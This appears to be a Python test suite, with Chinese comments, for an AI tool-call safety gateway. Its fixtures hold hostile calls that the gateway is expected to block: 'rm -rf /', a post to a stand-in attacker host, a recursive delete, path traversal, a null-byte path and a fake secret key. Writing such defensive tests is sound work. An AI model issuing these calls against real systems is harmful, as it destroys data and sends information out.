# -*- coding: utf-8 -*-
"""LINGSHU 验收 · 工具调用 STPA 前置网关（ADR-013 / docs/24 v1.1）

    python tests/test_tool_gateway.py

覆盖（H0 验收 + docs/24 §3/§8）：
- **危险场景 100% 拦截**：16 条 T-UCA 各 ≥1 危险用例（共 20 例）
- **良性场景 0 误杀**：≥7 个良性对照
- **VSM 状态门控**：冲突/相位/饱和/冻结/能力/审计上下文
- **fail-closed**：空 state、缺审计、null call、degrade 无审批通道
- **审计事件契约**（docs/24 §6）：`tool_gate` 字段逐项
- **Python↔JS parity**：同一批 20 个 case 经 node 子进程跑 JS 实现，逐条比对
  verdict/ucas（含 registry 与 docs §7 规则表的一致性）

原则：全部直接调用被测实现，不复制业务逻辑；实现退化时断言必须变红。
不使用 pytest（与仓库其余测试一致），退出码 0 = 全通过。
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from engine import tool_gateway as tg                      # noqa: E402

PLUGIN = os.path.join(ROOT, "plugin", "dsh-lingshu")
SIM = os.path.join(PLUGIN, "tool-gateway-sim.mjs")
DOC24 = os.path.join(ROOT, "docs", "24-工具网关UCA.md")
TMP_CASES = os.path.join(ROOT, "tests", "_tmp_tool_gateway_cases.json")
PASS, FAIL = [], []


def check(name: str, cond: bool, detail: str = "") -> None:
    (PASS if cond else FAIL).append(name)
    print(("  ok   " if cond else "  FAIL ") + name
          + (("  — " + str(detail)) if (detail and not cond) else ""))


def node_bin() -> str:
    for cand in (os.environ.get("NODE"), shutil.which("node"),
                 r"C:\Program Files\nodejs\node.exe"):
        if cand and os.path.isfile(cand):
            return cand
    return "node"


def run_node(args: list[str], timeout: int = 120) -> tuple[int, str, str]:
    proc = subprocess.run([node_bin()] + args, cwd=PLUGIN, capture_output=True,
                          text=True, encoding="utf-8", timeout=timeout)
    return proc.returncode, proc.stdout or "", proc.stderr or ""


def st(**over) -> dict:
    s = tg.default_state()
    s.update(over)
    return s


def call(tool: str, args: dict | None = None, cid: str = "c_test") -> dict:
    return {"id": cid, "tool": tool, "args": args if args is not None else {}}


# ══════════════════════════════════════════════════════════
# 0) 规则表单一来源：docs/24 §7 == engine 内联 == JS 内联
# ══════════════════════════════════════════════════════════
def test_policy_parity() -> None:
    print("\n[0] 规则表 parity（docs/24 §7 ↔ Python ↔ JS）")
    md = open(DOC24, encoding="utf-8").read()
    sec = md.split("## 7.", 1)[1]
    m = re.search(r"```json\s*\n(.*?)\n```", sec, re.S)
    check("docs/24 §7 有 json 代码块", bool(m))
    doc_policy = json.loads(m.group(1))
    check("docs policy_version == t-uca-1.1", doc_policy["policy_version"] == "t-uca-1.1",
          doc_policy["policy_version"])
    check("docs 规则数 16", len(doc_policy["rules"]) == 16, len(doc_policy["rules"]))
    check("engine.POLICY 与 docs/24 §7 逐字段相等", tg.POLICY == doc_policy)
    check("engine.POLICY_VERSION == t-uca-1.1", tg.POLICY_VERSION == "t-uca-1.1")
    check("engine 规则数 16 且 id 唯一", len(tg.POLICY["rules"]) == 16
          and len({r["id"] for r in tg.POLICY["rules"]}) == 16)
    check("degrade 恰 3 条（10/13/16）",
          [r["id"] for r in tg.POLICY["rules"] if r["verdict"] == "degrade"]
          == ["T-UCA-10", "T-UCA-13", "T-UCA-16"])
    check("每条规则 8 必填字段齐全",
          all(all(k in r for k in ("id", "verdict", "when", "args_check",
                                   "state_inputs", "test_id", "message_zh",
                                   "message_en"))
              for r in tg.POLICY["rules"]))
    check("engine 工具登记表 12 个且字段齐全",
          len(tg.REGISTRY) == 12
          and all({"class", "caps", "required_args", "path_arg"} <= set(e)
                  for e in tg.REGISTRY.values()))

    code, out, err = run_node([SIM, "--dump-policy"])
    check("node sim --dump-policy 可跑", code == 0, err[:200])
    js = json.loads(out) if code == 0 and out.strip() else {}
    check("JS POLICY 与 docs/24 §7 逐字段相等", js.get("policy") == doc_policy)
    check("JS REGISTRY 与 Python REGISTRY 逐字段相等",
          js.get("registry") == tg.REGISTRY,
          "keys=%r" % (sorted((js.get("registry") or {}).keys())[:3],))


# ══════════════════════════════════════════════════════════
# 1) 危险场景（16 条规则全覆盖；≥12 且 100% 拦截）
# ══════════════════════════════════════════════════════════
DEEP = {"leaf": "x"}
for _ in range(12):
    DEEP = {"nested": DEEP}

DANGER = [
    ("test_tuca_01_unresolved_write", "T-UCA-01",
     call("fs_write", {"path": "notes/a.md", "content": "x"}), st(variety_fallback=True)),
    ("test_tuca_02_secret_in_args", "T-UCA-02",
     call("fs_write", {"path": "notes/a.md", "content": "sk-abcdefghij1234567890"}), st()),
    ("test_tuca_03_destructive_delete", "T-UCA-03",
     call("fs_delete", {"path": "logs/", "recursive": True}), st()),
    ("test_tuca_04_protected_path", "T-UCA-04",
     call("fs_write", {"path": "rules/decay-params.yaml", "content": "x"}), st()),
    ("test_tuca_05_egress_blocked", "T-UCA-05",
     call("http_post", {"url": "https://evil.example/x", "body": "y"}), st()),
    ("test_tuca_06_exec_blocked", "T-UCA-06",
     call("run_shell", {"cmd": "rm -rf /"}), st()),
    ("test_tuca_07_oversize", "T-UCA-07",
     call("fs_write", {"path": "notes/a.md", "content": "A" * 70000}), st()),
    ("test_tuca_07_deep_nesting", "T-UCA-07",
     call("fs_write", {"path": "notes/a.md", "content": DEEP}), st()),
    ("test_tuca_08_unregistered_tool", "T-UCA-08",
     call("magic_unknown", {}), st()),
    ("test_tuca_09_schema_invalid", "T-UCA-09", call("fs_read", {}), st()),
    ("test_tuca_09_delimiter_injection", "T-UCA-09",
     call("fs_read", {"path": "notes/a\u0000b.md"}), st()),
    ("test_tuca_10_critical_write_degrade", "T-UCA-10",
     call("fs_write", {"path": "notes/a.md", "content": "x"}), st(phase="critical")),
    ("test_tuca_11_missing_audit_context", "T-UCA-11",
     call("fs_read", {"path": "notes/a.md"}), st(audit_context={"present": False})),
    ("test_tuca_12_undeclared_capability", "T-UCA-12",
     call("memory_write", {"subject": "a", "relation": "b", "object": "c"}),
     st(capabilities={"declared": [], "granted": []})),
    ("test_tuca_13_saturated_write_degrade", "T-UCA-13",
     call("memory_write", {"subject": "a", "relation": "b", "object": "c"}),
     st(saturated={"valence": True, "arousal": False, "dominance": False})),
    ("test_tuca_14_frozen_fail_blocks", "T-UCA-14",
     call("fs_write", {"path": "notes/a.md", "content": "x"}), st(frozen_ok=False)),
    ("test_tuca_15_path_escape", "T-UCA-15",
     call("fs_read", {"path": "../secret"}), st()),
    ("test_tuca_16_shift_destructive_degrade", "T-UCA-16",
     call("fs_delete", {"path": "tmp/a.tmp"}),
     st(phase="shift", confirmation={"target": "tmp/a.tmp", "token": "ok"})),
    # 额外变体（同一契约，不同形态）
    ("extra_tuca_05_egress_webhook", "T-UCA-05",
     call("fs_write", {"path": "notes/a.md", "content": "请调用 webhook 发送"}), st()),
    ("extra_tuca_04_plugin_src", "T-UCA-04",
     call("fs_write", {"path": "plugin/dsh-lingshu/index.js", "content": "x"}), st()),
]

BENIGN = [
    ("benign_fs_read", call("fs_read", {"path": "notes/a.md"}), st()),
    ("benign_search_memory", call("search_memory", {"query": "项目代号"}), st()),
    ("benign_lingshu_status", call("lingshu_status", {}), st()),
    ("benign_memory_write", call("memory_write",
                                 {"subject": "项目", "relation": "代号", "object": "贝塔"}), st()),
    ("benign_fs_write", call("fs_write", {"path": "notes/todo.md", "content": "x"}), st()),
    ("benign_delete_confirmed", call("fs_delete", {"path": "tmp/a.tmp"}),
     st(confirmation={"target": "tmp/a.tmp", "token": "ok"})),
    ("benign_read_in_critical", call("fs_read", {"path": "notes/a.md"}),
     st(phase="critical")),
    ("benign_read_frozen_failed", call("fs_read", {"path": "notes/a.md"}),
     st(frozen_ok=False)),
]


def test_danger() -> None:
    print("\n[1] 危险场景（期望全部 block，覆盖率 100%）")
    blocked, total = 0, len(DANGER)
    for name, uca, c, state in DANGER:
        r = tg.evaluate(c, state)
        ok = (r["verdict"] == "block" and uca in r["ucas"]
              and r["allowed"] is False and r["executed"] is False)
        blocked += 1 if ok else 0
        check(name, ok, "%s [%s]" % (r["verdict"], ",".join(r["ucas"])))
    print("  危险场景拦截：%d/%d" % (blocked, total))
    check("危险场景数 >= 12", total >= 12, total)
    check("危险场景拦截率 100%%", blocked == total, "%d/%d" % (blocked, total))
    # 审计里必须出现 T-UCA-xx
    for _name, _uca, c, state in DANGER[:5]:
        r = tg.evaluate(c, state)
        check("审计 ucas 全为 T-UCA-xx（%s）" % _name,
              all(re.fullmatch(r"T-UCA-\d{2}", u) for u in r["audit"]["ucas"]))


def test_benign() -> None:
    print("\n[2] 良性场景（期望 0 误杀）")
    killed, total = 0, len(BENIGN)
    for name, c, state in BENIGN:
        r = tg.evaluate(c, state)
        ok = r["verdict"] == "allow" and r["allowed"] is True and not r["ucas"]
        killed += 0 if ok else 1
        check(name, ok, "%s [%s]" % (r["verdict"], ",".join(r["ucas"])))
    print("  良性误杀：%d/%d" % (killed, total))
    check("良性场景数 >= 5", total >= 5, total)
    check("良性场景误杀数 == 0", killed == 0, killed)


# ══════════════════════════════════════════════════════════
# 2) VSM 状态门控 + fail-closed + degrade 语义
# ══════════════════════════════════════════════════════════
def test_state_and_failclosed() -> None:
    print("\n[3] VSM 状态门控 / fail-closed / degrade 语义")
    r = tg.evaluate(call("fs_write", {"path": "notes/a.md", "content": "x"}),
                    st(phase="weird"))
    check("phase 不可判定 + mutating → block（T-UCA-10）",
          r["verdict"] == "block" and "T-UCA-10" in r["ucas"])
    r = tg.evaluate(call("fs_read", {"path": "notes/a.md"}), {})
    check("空 state → block（缺审计上下文）", r["verdict"] == "block")
    r = tg.evaluate(None, None)
    check("null call → block（fail-closed）", r["verdict"] == "block")
    check("null call 命中未登记工具 T-UCA-08", "T-UCA-08" in r["ucas"])
    r2 = tg.evaluate(call("fs_read", {"path": "notes/a.md"}),
                     st(tool_registry={"fs_read": "broken-entry"}))
    check("registry 条目损坏 → fail-closed block", r2["verdict"] == "block")
    check("registry 条目损坏 → ucas 非空", bool(r2["ucas"]))

    for uca in ("T-UCA-10", "T-UCA-13", "T-UCA-16"):
        rule = next(x for x in tg.POLICY["rules"] if x["id"] == uca)
        check("%s 在契约里是 degrade" % uca, rule["verdict"] == "degrade")
    r = tg.evaluate(call("fs_write", {"path": "notes/a.md", "content": "x"}),
                    st(phase="critical"))
    check("degrade 无审批通道 → block + degraded_to=block",
          r["verdict"] == "block" and r["degraded_to"] == "block")
    check("degrade 降级后 allowed=false / executed=false",
          r["allowed"] is False and r["executed"] is False)
    r = tg.evaluate(call("fs_write", {"path": "notes/a.md", "content": "x"}),
                    st(phase="critical", approval_channel=True))
    check("有审批通道 → verdict=degrade 且仍不执行",
          r["verdict"] == "degrade" and r["allowed"] is False
          and r["executed"] is False and r["degraded_to"] is None)
    check("degrade 的强提示说明需确认", "确认" in r["message"])

    reg = dict(tg.REGISTRY)
    check("registry 缺字段 → T-UCA-08",
          "T-UCA-08" in tg.evaluate(
              call("fs_read", {"path": "notes/a.md"}),
              st(tool_registry={"fs_read": {"class": "read"}}))["ucas"])


# ══════════════════════════════════════════════════════════
# 3) 审计事件契约（docs/24 §6）
# ══════════════════════════════════════════════════════════
def test_audit_contract() -> None:
    print("\n[4] 审计事件契约（docs/24 §6）")
    # allow 路径也必须写 tool_gate
    r = tg.evaluate(call("fs_read", {"path": "notes/a.md"}), st())
    ev = r["audit"]
    check("allow 也产出 tool_gate（不可关闭审计）",
          ev["type"] == "tool_gate" and ev["schema"] == "lingshu/tool-gate/v1")
    check("allow 的 allowed=true / ucas=[]",
          ev["allowed"] is True and ev["ucas"] == [] and r["allowed"] is True)
    fields = ("schema", "type", "policy_version", "at", "session_id", "turn_id",
              "call_id", "tool", "tool_class", "verdict", "allowed", "ucas",
              "degraded_to", "requires_confirmation", "reason", "audit", "snapshot")
    check("tool_gate 顶层 17 字段齐全", all(k in ev for k in fields),
          [k for k in fields if k not in ev])
    check("policy_version=t-uca-1.1", ev["policy_version"] == "t-uca-1.1")
    sub = ("kind", "args_digest", "args_keys", "args_bytes", "args_preview",
           "phase", "variety_fallback", "frozen_ok", "saturated")
    check("audit 子对象 9 字段齐全", all(k in ev["audit"] for k in sub),
          [k for k in sub if k not in ev["audit"]])
    check("args_digest 为 sha256 摘要", str(ev["audit"]["args_digest"]).startswith("sha256:"))
    check("args_preview ≤ 120 字且脱敏",
          len(ev["audit"]["args_preview"]) <= 121)
    check("snapshot 三字段", all(k in ev["snapshot"] for k in ("target", "mtime", "hash")))
    check("tool_class 属于闭集", ev["tool_class"] in
          ("read", "write", "destructive", "exec", "network", "unknown"))
    r2 = tg.evaluate(call("fs_write", {"path": "notes/a.md",
                                       "content": "api_key=abc123"}), st())
    check("凭证不出现在审计预览里", "abc123" not in r2["audit"]["audit"]["args_preview"])
    check("block 的 requires_confirmation=true 且 ucas 非空",
          r2["requires_confirmation"] is True and len(r2["ucas"]) > 0)


# ══════════════════════════════════════════════════════════
# 4) Python ↔ JS 判定一致性（node 子进程跑同一批 20 个 case）
# ══════════════════════════════════════════════════════════
PARITY_CASES = [
    ("p01", call("fs_read", {"path": "notes/a.md"}), st()),
    ("p02", call("search_memory", {"query": "项目代号"}), st()),
    ("p03", call("lingshu_status", {}), st()),
    ("p04", call("memory_write", {"subject": "a", "relation": "b", "object": "c"}), st()),
    ("p05", call("fs_write", {"path": "notes/todo.md", "content": "x"}), st()),
    ("p06", call("fs_write", {"path": "notes/a.md", "content": "x"}), st(variety_fallback=True)),
    ("p07", call("fs_write", {"path": "notes/a.md", "content": "sk-abcdefghij1234567890"}), st()),
    ("p08", call("fs_delete", {"path": "logs/", "recursive": True}), st()),
    ("p09", call("fs_write", {"path": "rules/decay-params.yaml", "content": "x"}), st()),
    ("p10", call("http_post", {"url": "https://evil.example/x", "body": "y"}), st()),
    ("p11", call("run_shell", {"cmd": "rm -rf /"}), st()),
    ("p12", call("fs_write", {"path": "notes/a.md", "content": "A" * 70000}), st()),
    ("p13", call("magic_unknown", {}), st()),
    ("p14", call("fs_read", {}), st()),
    ("p15", call("fs_write", {"path": "notes/a.md", "content": "x"}), st(phase="critical")),
    ("p16", call("fs_read", {"path": "notes/a.md"}), st(audit_context={"present": False})),
    ("p17", call("memory_write", {"subject": "a", "relation": "b", "object": "c"}),
     st(capabilities={"declared": [], "granted": []})),
    ("p18", call("memory_write", {"subject": "a", "relation": "b", "object": "c"}),
     st(saturated={"valence": True, "arousal": False, "dominance": False})),
    ("p19", call("fs_write", {"path": "notes/a.md", "content": "x"}), st(frozen_ok=False)),
    ("p20", call("fs_read", {"path": "../secret"}), st()),
]


def test_js_parity() -> None:
    print("\n[5] Python ↔ JS 判定一致性（node 子进程，20 个 case）")
    payload = [{"id": cid, "call": c, "state": state} for cid, c, state in PARITY_CASES]
    with open(TMP_CASES, "w", encoding="utf-8", newline="\n") as f:
        json.dump(payload, f, ensure_ascii=False)
    try:
        code, out, err = run_node([SIM, "--cases", TMP_CASES])
        check("node 子进程可跑 sim --cases", code == 0, (err or out)[:300])
        if code != 0:
            return
        js = {x["id"]: x for x in json.loads(out)}
        same_v = same_u = same_d = 0
        for cid, c, state in PARITY_CASES:
            py = tg.evaluate(c, state)
            j = js.get(cid, {})
            same_v += 1 if py["verdict"] == j.get("verdict") else 0
            same_u += 1 if py["ucas"] == j.get("ucas") else 0
            same_d += 1 if py["degraded_to"] == j.get("degraded_to") else 0
            if py["verdict"] != j.get("verdict") or py["ucas"] != j.get("ucas"):
                check("parity %s" % cid, False,
                      "py=%s/%s js=%s/%s" % (py["verdict"], py["ucas"],
                                             j.get("verdict"), j.get("ucas")))
        n = len(PARITY_CASES)
        check("verdict 一致率 %d/%d" % (same_v, n), same_v == n, "%d/%d" % (same_v, n))
        check("ucas 一致率 %d/%d" % (same_u, n), same_u == n, "%d/%d" % (same_u, n))
        check("degraded_to 一致率 %d/%d" % (same_d, n), same_d == n, "%d/%d" % (same_d, n))
        print("  一致性：verdict %d/%d，ucas %d/%d" % (same_v, n, same_u, n))
    finally:
        if os.path.exists(TMP_CASES):
            os.remove(TMP_CASES)


# ══════════════════════════════════════════════════════════
# 5) JS 断言套件（--assert 全绿）
# ══════════════════════════════════════════════════════════
def test_js_sim() -> None:
    print("\n[6] JS sim --assert")
    code, out, err = run_node([SIM, "--assert"])
    check("tool-gateway-sim.mjs --assert 全绿（exit 0）", code == 0,
          (err or out)[-300:])


def main() -> int:
    print("LINGSHU 验收 · 工具调用 STPA 前置网关（docs/24 v1.1）")
    test_policy_parity()
    test_danger()
    test_benign()
    test_state_and_failclosed()
    test_audit_contract()
    test_js_parity()
    test_js_sim()
    print("\n%d passed, %d failed" % (len(PASS), len(FAIL)))
    if FAIL:
        print("FAILED: " + "; ".join(FAIL[:20]))
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
